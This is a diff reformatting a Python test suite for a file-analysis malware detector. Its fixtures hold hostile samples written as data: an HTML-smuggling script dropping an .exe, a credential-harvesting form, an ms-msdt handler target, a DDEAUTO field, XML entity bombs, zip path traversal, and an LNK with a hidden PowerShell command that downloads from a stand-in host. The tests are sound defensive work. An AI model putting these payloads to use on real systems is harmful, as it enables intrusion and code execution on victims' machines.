@@ -64,8 +64,10 @@ def test_sniff_types():
     assert sniff(svg).detected_type == "svg"
     assert sniff(b"hello world, plain text").detected_type == "text"
     assert sniff(b"").detected_type == "empty"
-    assert sniff(bytes.fromhex("4c0000000114020000000000c000000000000046") + b"\0" * 40
-                 ).detected_type == "lnk"
+    assert (
+        sniff(bytes.fromhex("4c0000000114020000000000c000000000000046") + b"\0" * 40).detected_type
+        == "lnk"
+    )
     assert sniff(b"MZ is just text here, not an exe").detected_type == "text"
 
 
@@ -108,8 +110,9 @@ def test_rtlo():
 # ----------------------------------------------------------------- archives
 def test_zip_encrypted_nested_traversal():
     inner = make_zip({"a.txt": b"hi"})
-    z = make_zip({"../../evil.txt": b"x", "nested.zip": inner, "readme.txt": b"r"},
-                 encrypt_flag=True)
+    z = make_zip(
+        {"../../evil.txt": b"x", "nested.zip": inner, "readme.txt": b"r"}, encrypt_flag=True
+    )
     a = analyze_file(z, "docs.zip")
     c = codes(a)
     assert {"file.archive.encrypted", "file.archive.nested", "file.archive.path_traversal"} <= c
@@ -139,8 +142,9 @@ def test_zip_malformed_and_too_many():
 
 
 def test_zip_bomb_declared_only():
-    lst = _archive.ZipListing(ok=True, entries=[
-        _archive.ZipEntry("big.bin", 3 << 30, 10_000, False, False)])
+    lst = _archive.ZipListing(
+        ok=True, entries=[_archive.ZipEntry("big.bin", 3 << 30, 10_000, False, False)]
+    )
     f = Findings()
     _archive.analyze_zip(lst, f)
     assert f.has("file.archive.bomb")
@@ -155,9 +159,11 @@ def test_traversal_helper():
 # ----------------------------------------------------------------- HTML / SVG
 def test_html_smuggling_base64_magic():
     blob = base64.b64encode(pe_stub(pad=2000)).decode()
-    html = (f"<html><script>var d='{blob}';var b=new Blob([atob(d)]);"
-            "var a=document.createElement('a');a.href=URL.createObjectURL(b);"
-            "a.download='doc.exe';a.click();</script></html>")
+    html = (
+        f"<html><script>var d='{blob}';var b=new Blob([atob(d)]);"
+        "var a=document.createElement('a');a.href=URL.createObjectURL(b);"
+        "a.download='doc.exe';a.click();</script></html>"
+    )
     a = analyze_file(html.encode(), "view.html")
     c = codes(a)
     assert "file.html.smuggling.payload" in c and "file.html.smuggling.pattern" in c
@@ -174,13 +180,18 @@ def test_html_blob_zip_magic_and_benign_image_blob():
 
 
 def test_html_credential_form_and_urls():
-    html = ('<html><meta http-equiv="refresh" content="0;url=https://go.example.test/x">'
-            '<form action="https://collect.example.test/post"><input type="password" name="p">'
-            '</form><a href="https://link.example.test/a">x</a>'
-            '<a href="http://www.w3.org/1999/xhtml">ns</a></html>')
+    html = (
+        '<html><meta http-equiv="refresh" content="0;url=https://go.example.test/x">'
+        '<form action="https://collect.example.test/post"><input type="password" name="p">'
+        '</form><a href="https://link.example.test/a">x</a>'
+        '<a href="http://www.w3.org/1999/xhtml">ns</a></html>'
+    )
     a = analyze_file(html.encode(), "login.html")
-    assert {"file.html.password_form", "file.html.external_form_action",
-            "file.html.meta_refresh"} <= codes(a)
+    assert {
+        "file.html.password_form",
+        "file.html.external_form_action",
+        "file.html.meta_refresh",
+    } <= codes(a)
     assert "https://collect.example.test/post" in a.child_urls
     assert "https://link.example.test/a" in a.child_urls
     assert "https://go.example.test/x" in a.child_urls
@@ -203,10 +214,19 @@ SVG_BAD = b"""<?xml version="1.0"?>
 def test_svg_script_external_image():
     a = analyze_file(SVG_BAD, "doc.svg")
     assert a.facts.detected_type == "svg"
-    assert {"file.svg.script", "file.svg.foreign_object", "file.svg.external_ref",
-            "file.svg.external_link", "file.svg.event_handler", "file.svg.redirect"} <= codes(a)
-    for u in ("https://img.example.test/logo.png", "https://login.example.test/verify",
-              "https://redir.example.test/a"):
+    assert {
+        "file.svg.script",
+        "file.svg.foreign_object",
+        "file.svg.external_ref",
+        "file.svg.external_link",
+        "file.svg.event_handler",
+        "file.svg.redirect",
+    } <= codes(a)
+    for u in (
+        "https://img.example.test/logo.png",
+        "https://login.example.test/verify",
+        "https://redir.example.test/a",
+    ):
         assert u in a.child_urls
     assert not any("w3.org" in u for u in a.child_urls)
 
@@ -214,8 +234,10 @@ def test_svg_script_external_image():
 def test_svg_clean_and_entity_bomb():
     clean = b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>'
     assert analyze_file(clean, "i.svg").indicators == []
-    bomb = (b'<?xml version="1.0"?><!DOCTYPE s [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]>'
-            b'<svg xmlns="http://www.w3.org/2000/svg"><text>&b;</text></svg>')
+    bomb = (
+        b'<?xml version="1.0"?><!DOCTYPE s [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]>'
+        b'<svg xmlns="http://www.w3.org/2000/svg"><text>&b;</text></svg>'
+    )
     a = analyze_file(bomb, "i.svg")
     assert "file.svg.xml_entities" in codes(a)
 
@@ -227,8 +249,10 @@ def test_svg_malformed_falls_back():
 
 # ----------------------------------------------------------------- PDF
 def test_pdf_openaction_uri():
-    pdf = (b"%PDF-1.7\n1 0 obj<</OpenAction 2 0 R>>endobj\n"
-           b"2 0 obj<</S/URI/URI(https://pay.example.test/now)>>endobj\n")
+    pdf = (
+        b"%PDF-1.7\n1 0 obj<</OpenAction 2 0 R>>endobj\n"
+        b"2 0 obj<</S/URI/URI(https://pay.example.test/now)>>endobj\n"
+    )
     a = analyze_file(pdf, "inv.pdf")
     assert {"file.pdf.open_action", "file.pdf.uri"} <= codes(a)
     assert a.child_urls == ["https://pay.example.test/now"]
@@ -261,15 +285,21 @@ def ooxml(extra: dict[str, bytes]) -> bytes:
 
 
 def rels(target: str, rtype: str, mode: str = "External") -> bytes:
-    return (f'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
-            f'<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
-            f'relationships/{rtype}" Target="{target}" TargetMode="{mode}"/></Relationships>'
-            ).encode()
+    return (
+        f'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+        f'<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
+        f'relationships/{rtype}" Target="{target}" TargetMode="{mode}"/></Relationships>'
+    ).encode()
 
 
 def test_ooxml_remote_template():
-    d = ooxml({"word/_rels/settings.xml.rels":
-               rels("https://tpl.example.test/t.dotm", "attachedTemplate")})
+    d = ooxml(
+        {
+            "word/_rels/settings.xml.rels": rels(
+                "https://tpl.example.test/t.dotm", "attachedTemplate"
+            )
+        }
+    )
     a = analyze_file(d, "r.docx")
     assert a.facts.detected_type == "ooxml" and not a.facts.ext_mismatch
     assert "file.office.remote_template" in codes(a)
@@ -280,28 +310,40 @@ def test_ooxml_hyperlink_is_not_template_and_protocol_handler():
     d = ooxml({"word/_rels/document.xml.rels": rels("https://a.example.test/", "hyperlink")})
     a = analyze_file(d, "r.docx")
     assert codes(a) == set() and a.child_urls == ["https://a.example.test/"]
-    h = ooxml({"word/_rels/document.xml.rels":
-               rels("ms-msdt:/id PCWDiagnostic /skip force", "oleObject")})
+    h = ooxml(
+        {"word/_rels/document.xml.rels": rels("ms-msdt:/id PCWDiagnostic /skip force", "oleObject")}
+    )
     assert "file.office.protocol_handler" in codes(analyze_file(h, "r.docx"))
 
 
 def test_ooxml_dde_macro_xlm_embedding():
-    dde = ooxml({"word/document.xml":
-                 b'<w:p><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\x "a" </w:instrText>'
-                 b'</w:r></w:p>'})
+    dde = ooxml(
+        {
+            "word/document.xml": b'<w:p><w:r><w:instrText xml:space="preserve">'
+            b' DDEAUTO c:\\x "a" </w:instrText>'
+            b"</w:r></w:p>"
+        }
+    )
     assert "file.office.dde" in codes(analyze_file(dde, "a.docx"))
     m = ooxml({"word/vbaProject.bin": b"\x00" * 64, "word/embeddings/oleObject1.bin": b"x"})
     c = codes(analyze_file(m, "a.docm"))
     assert {"file.office.macro", "file.office.embedded_object"} <= c
-    x = make_zip({"[Content_Types].xml": b"<Types/>", "xl/workbook.xml": b"<x/>",
-                  "xl/macrosheets/sheet1.xml": b"<x/>"})
+    x = make_zip(
+        {
+            "[Content_Types].xml": b"<Types/>",
+            "xl/workbook.xml": b"<x/>",
+            "xl/macrosheets/sheet1.xml": b"<x/>",
+        }
+    )
     assert "file.office.xlm_macro" in codes(analyze_file(x, "a.xlsx"))
 
 
 def test_ooxml_rel_xml_entities_are_refused():
-    evil = (b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "x">]><Relationships>'
-            b'<Relationship Type="t/oleObject" Target="&a;" TargetMode="External"/>'
-            b'</Relationships>')
+    evil = (
+        b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "x">]><Relationships>'
+        b'<Relationship Type="t/oleObject" Target="&a;" TargetMode="External"/>'
+        b"</Relationships>"
+    )
     a = analyze_file(ooxml({"word/_rels/document.xml.rels": evil}), "a.docx")
     assert "file.office.external_object" not in codes(a)
 
@@ -318,9 +360,12 @@ class FakeVBA:
         return self.has
 
     def analyze_macros(self, show_decoded_strings=False):
-        return [("AutoExec", "Document_Open", "runs on open"),
-                ("Suspicious", "CreateObject", "x"), ("Suspicious", "Shell", "y"),
-                ("IOC", "https://c2.example.test/p", "URL")]
+        return [
+            ("AutoExec", "Document_Open", "runs on open"),
+            ("Suspicious", "CreateObject", "x"),
+            ("Suspicious", "Shell", "y"),
+            ("IOC", "https://c2.example.test/p", "URL"),
+        ]
 
     def extract_macros(self):
         yield ("f", "s", "m", 'x = "https://stage.example.test/a"')
@@ -333,7 +378,8 @@ def test_apply_olevba_with_standin_parser():
     f = Findings()
     assert _office.apply_olevba(FakeVBA(), f)
     assert {"file.office.macro", "file.office.autoexec", "file.office.suspicious_keywords"} <= {
-        i.code for i in f.indicators}
+        i.code for i in f.indicators
+    }
     assert "https://c2.example.test/p" in f.urls and "https://stage.example.test/a" in f.urls
     g = Findings()
     assert not _office.apply_olevba(FakeVBA(False), g) and not g.indicators
@@ -353,7 +399,7 @@ def build_cfb() -> bytes:
     for i, n in enumerate(names):
         raw = n.encode("utf-16-le")
         e = bytearray(128)
-        e[0:len(raw)] = raw
+        e[0 : len(raw)] = raw
         struct.pack_into("<H", e, 64, len(raw) + 2)
         e[66] = types[i]
         e[67] = 1
@@ -370,12 +416,12 @@ def build_cfb() -> bytes:
     hdr = bytearray(SEC)
     hdr[0:8] = bytes.fromhex("d0cf11e0a1b11ae1")
     struct.pack_into("<HHHHH", hdr, 24, 0x3E, 3, 0xFFFE, 9, 6)
-    struct.pack_into("<I", hdr, 44, 1)           # FAT sectors
-    struct.pack_into("<I", hdr, 48, 1)           # first dir sector
-    struct.pack_into("<I", hdr, 56, 0)           # mini stream cutoff = 0
+    struct.pack_into("<I", hdr, 44, 1)  # FAT sectors
+    struct.pack_into("<I", hdr, 48, 1)  # first dir sector
+    struct.pack_into("<I", hdr, 56, 0)  # mini stream cutoff = 0
     struct.pack_into("<I", hdr, 60, 0xFFFFFFFE)  # no mini FAT
     struct.pack_into("<I", hdr, 68, 0xFFFFFFFE)  # no DIFAT
-    struct.pack_into("<I", hdr, 76, 0)           # DIFAT[0] -> FAT at sector 0
+    struct.pack_into("<I", hdr, 76, 0)  # DIFAT[0] -> FAT at sector 0
     for k in range(1, 109):
         struct.pack_into("<I", hdr, 76 + 4 * k, 0xFFFFFFFF)
     return bytes(hdr) + fat_b + bytes(ents) + b"\x00" * (stream_sectors * SEC)
@@ -402,8 +448,11 @@ def test_script_and_lnk_commands():
     a = analyze_file(ps, "update.ps1")
     assert {"file.type.script", "file.script.suspicious_commands"} <= codes(a)
     assert "https://drop.example.test/p" in a.child_urls
-    lnk = (bytes.fromhex("4c0000000114020000000000c000000000000046") + b"\0" * 20
-           + "cmd.exe /c powershell -nop -w hidden iwr https://l.example.test/x".encode("utf-16-le"))
+    lnk = (
+        bytes.fromhex("4c0000000114020000000000c000000000000046")
+        + b"\0" * 20
+        + "cmd.exe /c powershell -nop -w hidden iwr https://l.example.test/x".encode("utf-16-le")
+    )
     b = analyze_file(lnk, "Scan.pdf.lnk")
     assert {"file.type.shortcut", "file.lnk.command", "file.double_extension"} <= codes(b)
     assert "https://l.example.test/x" in b.child_urls
